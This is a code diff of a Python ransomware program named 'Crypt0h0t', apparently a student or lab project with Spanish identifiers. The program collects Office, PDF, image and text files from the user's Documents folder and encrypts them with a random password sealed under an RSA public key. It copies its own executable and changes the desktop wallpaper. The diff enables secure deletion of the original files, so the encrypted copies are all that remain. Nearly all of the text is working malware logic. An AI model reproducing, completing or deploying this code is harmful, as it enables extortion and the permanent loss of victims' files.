@@ -12,6 +12,8 @@ import base64
 
 import secure_delete
 from wallpaper import cambiarFondo
+from llave import extraeLlave
+
 
 class Crypt0h0t:
     def __init__(self) -> None:
@@ -19,7 +21,8 @@ class Crypt0h0t:
         self.archivos = []
         self.pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')
         self.listarArchivos()
-        self.generarPassword()
+        path = extraeLlave()
+        self.generarPassword(path)
 
     def listarArchivos( self ):
         documentos_path = os.path.join( os.environ['USERPROFILE'], 'Documents' )
@@ -28,9 +31,9 @@ class Crypt0h0t:
                 if self.pattern.match( file ): 
                     self.archivos.append( os.path.join( root, file ) )
 
-    def generarPassword( self ):
+    def generarPassword( self, archivo ):
         self.password =  base64.urlsafe_b64encode( get_random_bytes( 16 ) )
-        with open( 'pp_pubkey.pem', 'rb' ) as archivo:
+        with open( archivo, 'rb' ) as archivo:
             llavePublica = RSA.import_key( archivo.read() )
         cipher = PKCS1_OAEP.new( llavePublica )  
         passwordCifrada = cipher.encrypt( self.password )
@@ -58,7 +61,7 @@ class Crypt0h0t:
                 f.write( cipher.nonce )
                 f.write( tag )
                 f.write( ciphertext )
-            # secure_delete.delete(archivo)
+            secure_delete.delete(archivo)
 
     def copiarExe( self ):
         origen = sys.executable
@@ -69,8 +72,8 @@ class Crypt0h0t:
             print( f'No jalo: {e}' )
 
 def main():
+    cambiarFondo( 'Malware.jpg' )
     r = Crypt0h0t()
     r.copiarExe()
     r.cifrarArchivos()
-    cambiarFondo( 'Malware.png' )
 main()
